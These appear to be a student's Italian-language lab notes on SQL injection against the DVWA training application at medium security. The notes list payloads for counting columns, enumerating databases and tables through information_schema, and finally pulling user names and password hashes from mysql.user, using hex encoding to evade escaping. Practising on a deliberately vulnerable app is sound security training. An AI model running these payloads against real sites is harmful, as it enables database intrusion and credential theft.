// Fase 1
' OR '1'='1' -- - // Non va perche il livello medium escapa alcuni caratteri mysql_real_escape_string($id)
1 OR 1=1 // FUNZIONA Per fare contento il prof usare hex

// Fase 2: Capire quanti campi seleziona la query inviata dal sorgente del sito php
1 OR 1=1 UNION SELECT null -- - The used SELECT statements have a different number of columns // Errore ma ci da l'info
ID: 1 OR 1=1 UNION SELECT null, null -- - OK 2 colonne

// Fase 3: Capire che user sta eseguendo le query
https://www.w3schools.com/sql/func_mysql_user.asp
1 UNION SELECT user(), null #

admin
root@localhost

// Fase 3: Vedere il database corrente
https://www.w3schools.com/sql/func_mysql_database.asp
unico database chiamato 'dvwa'
1 OR 1=1 UNION SELECT database(), null -- -

// Fase 4: Tutti i database
https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html
1 UNION SELECT schema_name, null FROM information_schema.schemata -- -

// Fase 5: Vedere tutte le tabelle nel database mysql
https://dev.mysql.com/doc/refman/8.4/en/information-schema-tables-table.html
1 UNION SELECT mysql, null FROM information_schema.tables -- -

// Fase 5: Vedere tutte le tabelle nel database dvwa
https://dev.mysql.com/doc/refman/8.4/en/information-schema-tables-table.html
1 OR 1=1 UNION SELECT dvwa, null FROM information_schema.tables -- -

// Lista di tutte le tabelle in tutti i database. CONFUSONARIO
0x27 UNION SELECT table_name, null FROM information_schema.tables -- -

// Lista tabelle, database
0x27 UNION SELECT table_name, table_schema FROM information_schema.tables -- -

// NON so come raggiungere le colonne
https://dev.mysql.com/doc/refman/8.4/en/information-schema-columns-table.html

// risultati colonne per tabella
0x27 UNION SELECT CONCAT(table_name, 0x2e,table_schema),column_name  FROM information_schema.columns --

//Query finale
' UNION SELECT user,password  FROM mysql.user --
0x27 UNION SELECT 0x75736575 , 0x70617373776f7264  FROM mysql.user --
' UNION SELECT CONCAT(user, '.', password), CONCAT(host, '.', Drop_priv) FROM mysql.user #

// Query 0x27 UNION SELECT user,password  FROM mysql.user WHERE user = 0x726f6f74#
0x27 UNION SELECT CONCAT(select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Shutdown_priv,Execute_priv,Create_user_priv),null  FROM mysql.user WHERE user = 0x726f6f74#

MySQL -h <IP_META> -u root -p --skip-ssl